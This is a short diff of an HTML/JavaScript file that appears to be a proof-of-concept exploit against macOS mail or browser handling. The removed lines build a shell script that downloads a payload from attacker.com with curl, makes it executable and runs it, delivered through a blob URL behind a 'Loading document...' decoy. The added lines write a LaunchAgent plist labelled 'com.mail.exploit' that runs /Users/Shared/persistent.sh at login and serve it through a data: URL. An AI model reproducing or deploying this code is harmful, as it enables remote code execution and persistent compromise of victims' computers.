@@ -1,17 +1,18 @@
-<!DOCTYPE html>
-<html>
-<body>
 <script>
-const shellScript = `#!/bin/bash
-echo "Script executed: $(date)" > /Users/Shared/script_proof.txt
-# Download and execute payload
-curl -s http://attacker.com/malware.sh -o /tmp/payload.sh
-chmod +x /tmp/payload.sh
-/tmp/payload.sh &`;
+// Write to auto-start locations
+const launchAgent = `<?xml version="1.0"?>
+<plist>
+<dict>
+    <key>Label</key>
+    <string>com.mail.exploit</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/Users/Shared/persistent.sh</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+</plist>`;
 
-const blob = new Blob([shellScript], {type: 'application/x-shellscript'});
-window.location.href = URL.createObjectURL(blob);
+window.location.href = 'data:application/x-plist,' + encodeURIComponent(launchAgent);
 </script>
-<p>Loading document...</p>
-</body>
-</html>
